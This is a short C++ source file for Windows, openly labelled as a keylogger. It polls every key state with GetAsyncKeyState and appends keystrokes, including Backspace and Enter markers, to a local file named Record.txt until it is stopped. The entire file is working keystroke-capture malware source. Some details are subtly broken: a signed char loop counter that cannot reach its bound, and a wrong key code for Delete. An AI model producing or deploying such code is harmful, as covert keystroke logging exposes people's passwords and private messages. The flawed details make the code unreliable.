#include <csignal>
#include <fstream>
#include <iostream>
#include <windows.h>
#include <winuser.h>

using namespace std;

void logKeys();
void signalHandler(int signal);

bool shouldTerminate = false;

int main() {
  signal(SIGINT, signalHandler); // Set up signal handler for Ctrl+C
  cout << "Keylogger is running. Press Ctrl+C to exit.\n";
  logKeys();
  return 0;
}

void signalHandler(int signal) {
  if (signal == SIGINT) {
    shouldTerminate = true;
  }
}

void logKeys() {
  char c;
  while (!shouldTerminate) {
    for (c = 8; c <= 222; c++) {
      if (GetAsyncKeyState(c) == -32767) {
        ofstream write("Record.txt", ios::app);
        switch (c) {
        case 8:
          write << "<Backspace>";
          break;
        case 27: // Escape key terminates the keylogger
          shouldTerminate = true;
          break;
        case 127:
          write << "<Del>";
          break;
        case 32:
          write << " ";
          break;
        case 13:
          write << "<Enter>\n";
          break;
        default:
          write << c;
        }
      }
    }
    Sleep(10); // Add a small delay to prevent high CPU usage
  }
}